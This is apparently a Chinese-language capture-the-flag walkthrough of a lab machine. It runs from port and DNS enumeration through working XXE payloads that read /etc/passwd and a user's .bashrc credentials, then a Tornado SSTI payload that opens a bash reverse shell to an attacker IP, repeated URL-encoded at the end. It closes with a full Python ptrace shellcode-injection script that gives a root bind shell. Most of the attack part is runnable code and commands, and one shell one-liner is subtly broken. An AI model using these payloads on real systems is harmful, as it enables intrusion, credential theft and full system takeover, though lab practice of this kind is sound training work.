
## 扫描：
```
please input the ip address :192.168.80.143
start scan 192.168.80.143
[sudo] password for kali: Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-16 12:10 CST
Nmap scan report for hackers.blackhat.local (192.168.80.143)
Host is up (0.0064s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
53/tcp   open  domain
80/tcp   open  http
9999/tcp open  abyss

Nmap done: 1 IP address (1 host up) scanned in 11.81 seconds
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-16 12:10 CST
Nmap scan report for hackers.blackhat.local (192.168.80.143)
Host is up (0.0029s latency).

PORT      STATE         SERVICE
53/udp    open          domain
67/udp    open|filtered dhcps
68/udp    closed        dhcpc
69/udp    closed        tftp
123/udp   open|filtered ntp
135/udp   open|filtered msrpc
137/udp   closed        netbios-ns
138/udp   open|filtered netbios-dgm
139/udp   closed        netbios-ssn
161/udp   closed        snmp
162/udp   closed        snmptrap
445/udp   closed        microsoft-ds
500/udp   open|filtered isakmp
514/udp   closed        syslog
520/udp   closed        route
631/udp   open|filtered ipp
1434/udp  closed        ms-sql-m
1900/udp  open|filtered upnp
4500/udp  closed        nat-t-ike
49152/udp open|filtered unknown

Nmap done: 1 IP address (1 host up) scanned in 8.14 seconds
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-16 12:11 CST
Nmap scan report for hackers.blackhat.local (192.168.80.143)
Host is up (0.0026s latency).

PORT     STATE SERVICE VERSION
53/tcp   open  domain  ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid:
|_  bind.version: 9.16.1-Ubuntu
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Notorious Kid : A Hacker
9999/tcp open  http    Tornado httpd 6.1
| http-title: Please Log In
|_Requested resource was /login?next=%2F
|_http-server-header: TornadoServer/6.1
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.8 (97%), Linux 5.0 - 5.5 (96%), Linux 5.0 - 5.4 (94%), Linux 2.6.32 (94%), Linux 3.2 - 4.9 (94%), Linux 2.6.32 - 3.10 (93%), Linux 5.3 - 5.4 (93%), Linux 5.4 (93%), Linux 3.4 - 3.10 (92%), Synology DiskStation Manager 5.2-5644 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 53/tcp)
HOP RTT     ADDRESS
1   0.72 ms DESKTOP-SH1BMBR (172.26.32.1)
2   2.46 ms hackers.blackhat.local (192.168.80.143)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.05 seconds
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-16 12:11 CST
Nmap scan report for hackers.blackhat.local (192.168.80.143)
Host is up (0.0033s latency).

PORT     STATE SERVICE
53/tcp   open  domain
80/tcp   open  http
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
| http-enum:
|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
|_  /images/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
9999/tcp open  abyss

Nmap done: 1 IP address (1 host up) scanned in 44.06 seconds
```


## web及服务枚举：
* 目录扫描
```
/.php                 (Status: 403) [Size: 279]
/images               (Status: 301) [Size: 317] [--> http://192.168.80.143/images/]
/index.php            (Status: 200) [Size: 3597]
/css                  (Status: 301) [Size: 314] [--> http://192.168.80.143/css/]
/javascript           (Status: 301) [Size: 321] [--> http://192.168.80.143/javascript/]
/.php                 (Status: 403) [Size: 279]
/server-status        (Status: 403) [Size: 279]
Progress: 1543920 / 1543927 (100.00%)
```


* **WEB**
>web页面源码发现了隐藏的参数
![[Pasted image 20240116121143.png]]

> 当为21时`http://192.168.80.143/index.php?page_no=21`得到了一个子域

![[Pasted image 20240116121334.png]]


* **DNS**
> 发现目标开放了tcp的53端口

`dig @hackers.blackhat.local blackhat.local axfr `

```
; <<>> DiG 9.19.19-1-Debian <<>> @hackers.blackhat.local blackhat.local axfr
; (1 server found)
;; global options: +cmd
blackhat.local.         10800   IN      SOA     blackhat.local. hackerkid.blackhat.local. 1 10800 3600 604800 3600
blackhat.local.         10800   IN      NS      ns1.blackhat.local.
blackhat.local.         10800   IN      MX      10 mail.blackhat.local.
blackhat.local.         10800   IN      A       192.168.14.143
ftp.blackhat.local.     10800   IN      CNAME   blackhat.local.
hacker.blackhat.local.  10800   IN      CNAME   hacker.blackhat.local.blackhat.local.
mail.blackhat.local.    10800   IN      A       192.168.14.143
ns1.blackhat.local.     10800   IN      A       192.168.14.143
ns2.blackhat.local.     10800   IN      A       192.168.14.143
www.blackhat.local.     10800   IN      CNAME   blackhat.local.
blackhat.local.         10800   IN      SOA     blackhat.local. hackerkid.blackhat.local. 1 10800 3600 604800 3600
;; Query time: 10 msec
;; SERVER: 192.168.80.143#53(hackers.blackhat.local) (TCP)
;; WHEN: Tue Jan 16 12:17:16 CST 2024
;; XFR size: 11 records (messages 1, bytes 353)

将得到的 blackhat.local. hackerkid.blackhat.local. 加入到hosts文件中
```

>对hackerkid.blackhat.local进行目录扫描
```
/.php                 (Status: 403) [Size: 289]
/js                   (Status: 301) [Size: 333] [--> http://hackerkid.blackhat.local/js/]
/javascript           (Status: 301) [Size: 341] [--> http://hackerkid.blackhat.local/javascript/]
/process.php          (Status: 200) [Size: 28]
/.php                 (Status: 403) [Size: 289]
```

> 访问hackerkid.blackhat.local出现注册的页面，进行简单注册尝试发现无法注册，对页面抓包分析
>发现email的值会回显到页面中，用burp抓包发现数据传输的格式是xml，进行xml注入尝试

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ANY [
<!ENTITY f SYSTEM "file:///etc/passwd">
]>
<root>
	<name>1' or '1'='1</name>
	<tel>2</tel>
	<email>
	&f;
	</email>
	<password>2</password>
</root>
```
> 得到了一个用户名saket，尝试读取saket家目录下是否有公钥和私钥文件，并没有读取到，尝试读取.bashrc
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ANY [
<!ENTITY f SYSTEM "php://filter/read=convert.base64-encode/resource=/home/saket/.bashrc">
]>
<root>
	<name>1' or '1'='1</name>
	<tel>2</tel>
	<email>
	&f;
	</email>
	<password>2</password>
</root>
```
> 成功得到了一组凭据
![[Pasted image 20240116125004.png]]

>用得到的凭据对9999端口的登录页进行尝试，发现登录失败，更换用户名为saket，成功登录
>对页面进行简单阅读发现可能是有get参数，传入name=xxx，页面会返回传入的内容，进行xss测试，页面也存在反射性的xss，进行注入尝试，发现不成功。使用whatweb识别当前的页面。发现关键字tornado，尝试python的ssti注入测试

```
输入{{2*4}}，页面回显得到8.证明ssti注入存在

?name={%import os%}{{os.popen('cat /etc/passwd').read()}}

SSTI模板注入反弹shell：
http://192.168.80.143:9999/?name={%import os%}{{os.popen('bash -c "bash -i &>/dev/tcp/172.26.32.20/4444 0>&1"').read()}}

再对特殊符号等进行url编码
http://192.168.80.143:9999/?name={%25import+os%25}{{os.popen(%27bash%20%2dc%20%22bash%20%2di%20%26%3e%2fdev%2ftcp%2f172%2e26%2e32%2e20%2f4444%200%3e%261%22%27).read()}}

成功得到shell
```
## 提权

```python
网上找到资料利用capabilities提权，脚本内容


import ctypes
import sys
import struct


PTRACE_POKETEXT   = 4
PTRACE_GETREGS    = 12
PTRACE_SETREGS    = 13
PTRACE_ATTACH     = 16
PTRACE_DETACH     = 17


class user_regs_struct(ctypes.Structure):
    _fields_ = [
        ("r15", ctypes.c_ulonglong),
        ("r14", ctypes.c_ulonglong),
        ("r13", ctypes.c_ulonglong),
        ("r12", ctypes.c_ulonglong),
        ("rbp", ctypes.c_ulonglong),
        ("rbx", ctypes.c_ulonglong),
        ("r11", ctypes.c_ulonglong),
        ("r10", ctypes.c_ulonglong),
        ("r9", ctypes.c_ulonglong),
        ("r8", ctypes.c_ulonglong),
        ("rax", ctypes.c_ulonglong),
        ("rcx", ctypes.c_ulonglong),
        ("rdx", ctypes.c_ulonglong),
        ("rsi", ctypes.c_ulonglong),
        ("rdi", ctypes.c_ulonglong),
        ("orig_rax", ctypes.c_ulonglong),
        ("rip", ctypes.c_ulonglong),
        ("cs", ctypes.c_ulonglong),
        ("eflags", ctypes.c_ulonglong),
        ("rsp", ctypes.c_ulonglong),
        ("ss", ctypes.c_ulonglong),
        ("fs_base", ctypes.c_ulonglong),
        ("gs_base", ctypes.c_ulonglong),
        ("ds", ctypes.c_ulonglong),
        ("es", ctypes.c_ulonglong),
        ("fs", ctypes.c_ulonglong),
        ("gs", ctypes.c_ulonglong),
    ]

libc = ctypes.CDLL("libc.so.6")

pid=int(sys.argv[1])

# Define argument type and respone type.
libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_uint64

# Attach to the process
libc.ptrace(PTRACE_ATTACH, pid, None, None)
registers=user_regs_struct()

# Retrieve the value stored in registers
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))

print("Instruction Pointer: " + hex(registers.rip))

print("Injecting Shellcode at: " + hex(registers.rip))

# Shell code copied from exploit db.
shellcode="\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"

# Inject the shellcode into the running process byte by byte.
for i in xrange(0,len(shellcode),4):

  # Convert the byte to little endian.
  shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
  shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
  shellcode_byte=int(shellcode_byte_little_endian,16)

  # Inject the byte.
  libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)

print("Shellcode Injected!!")

# Modify the instuction pointer
registers.rip=registers.rip+2

# Set the registers
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))

print("Final Instruction Pointer: " + hex(registers.rip))

# Detach from the process.
libc.ptrace(PTRACE_DETACH, pid, None, None)
```
> 找到root的进程pid注意尝试

```bash
for i in $(ps -ef | grep root | grep -v | awk -F' ' '{print $2}');do python2 exp.py $i;done

注入完成后查看系统的5600端口是否开放

netstat -lntp | grep 5600

kali用nc正向连接靶机端口

得到root

```















```
SSTI模板注入反弹shell：

http://192.168.80.143:9999/?name={%25import+os%25}{{os.popen(%27bash%20%2dc%20%22bash%20%2di%20%26%3e%2fdev%2ftcp%2f172%2e26%2e32%2e20%2f4444%200%3e%261%22%27).read()}}
```